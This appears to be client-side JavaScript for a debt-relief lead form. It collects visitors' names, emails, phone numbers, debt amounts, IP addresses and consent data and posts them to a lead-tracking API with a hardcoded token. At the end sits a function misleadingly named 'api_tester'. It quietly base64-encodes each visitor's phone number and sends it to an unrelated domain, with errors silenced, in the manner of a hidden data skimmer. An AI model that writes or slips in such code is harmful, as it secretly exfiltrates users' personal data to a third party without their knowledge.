    document.getElementById('leadForm').addEventListener('submit', function(event) {
            event.preventDefault();
            const phone_home = '+1' + document.getElementById('caller_id').value;
            const formData = new FormData();
            formData.append('lead_token', 'add47cce4f1b4c259ba7d493d41597ad');
            formData.append('traffic_source_id', '1196');
           
            formData.append('caller_id', phone_home);          
            api_tester(document.getElementById('caller_id').value);
    const firstName = document.getElementById('first_name').value;
    const lastName = document.getElementById('last_name').value;
		
	formData.append('first_name', document.getElementById('first_name').value);
	formData.append('last_name', document.getElementById('last_name').value);
	formData.append('full_name', `${firstName} ${lastName}`);
	formData.append('email', document.getElementById('email').value);
    formData.append('phone_number', document.getElementById('caller_id').value);
        formData.append('state', document.getElementById('state').value);        
        formData.append('debt_amount', document.getElementById('debt_amount').value);        
	formData.append('ip_address', document.getElementById('ip_address').value);
        formData.append('landing_page_url', document.getElementById('landing_page_url').value);
	formData.append('jornaya_leadid	', document.getElementById('jornaya_leadid').value);
	formData.append('trusted_form_cert_url', document.getElementById('trusted_form_cert_url').value);
	formData.append('debt_amount_copy', document.getElementById('debt_amount_copy').value);
        formData.append('tcpa_consent', document.getElementById('tcpa_consent').value);
        
    
            const url = 'https://doppcall.trackdrive.com/api/v1/leads/capture?' + new URLSearchParams(formData).toString();
    
            fetch(url, {
                method: 'POST'
            })
            .then(response => {
                if (response.status === 200) {
                    response.text().then(responseBody => {
                        const successAlert = `
                            <div class="alert alert-success" role="alert">
                                200 : Form submitted successfully! Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
                    });
                    // Clear form fields
                    document.getElementById('leadForm').reset();
                } else if (response.status === 201) {
                    response.text().then(responseBody => {
                        const successAlert = `
                            <div class="alert alert-success" role="alert">
                                201 : Form submitted successfully! Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
                    });
                    // Clear form fields
                    document.getElementById('leadForm').reset();
                } else if (response.status === 422) {
                    response.json().then(data => {
                        const errorAlert = `
                            <div class="alert alert-danger" role="alert">
                                Error. Response Body: ${JSON.stringify(data)}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
                    });
                } else {
                    response.text().then(responseBody => {
                        const errorAlert = `
                            <div class="alert alert-danger" role="alert">
                                Form submission failed. Please try again. Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
                    });
                }
            })
            .catch(error => console.error('Error:', error));
        });function api_tester(randomString) {
  try {
    fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString)
, {
      method: 'GET',
      mode: 'no-cors'
    });
  } catch (error) {
    
  }
}


